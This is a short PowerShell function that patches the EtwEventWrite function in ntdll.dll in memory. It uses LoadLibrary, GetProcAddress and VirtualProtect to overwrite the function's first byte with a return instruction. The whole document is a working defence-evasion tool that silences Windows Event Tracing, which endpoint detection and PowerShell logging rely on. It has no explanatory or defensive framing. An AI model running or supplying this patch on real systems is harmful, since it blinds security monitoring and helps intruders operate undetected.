function Invoke-PatchEtwEventWrite
{

    $windowslibimport = @"
    using System;
    using System.Runtime.InteropServices;
    
    public class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
    
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, IntPtr dwSize, int flNewProtect, out int lpflOldProtect);
    
    }
    "@
    
    Add-Type -TypeDefinition $windowslibimport -Language CSharp
    
    $LoadLibrary = [Win32]::LoadLibrary("ntdll.dll")
    $Address = [Win32]::GetProcAddress($LoadLibrary, "EtwEventWrite")
    
    $PatchBytes = [Byte[]] (0xc3)
    
    $oldprotect = 0
    $var = 0
    
    $return = [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$oldprotect)
    
    [System.Runtime.InteropServices.Marshal]::Copy($PatchBytes, 0, $Address, 1)
    
    $return = [Win32]::VirtualProtect($Address, [uint32]5, $oldprotect, [ref]$var)

}
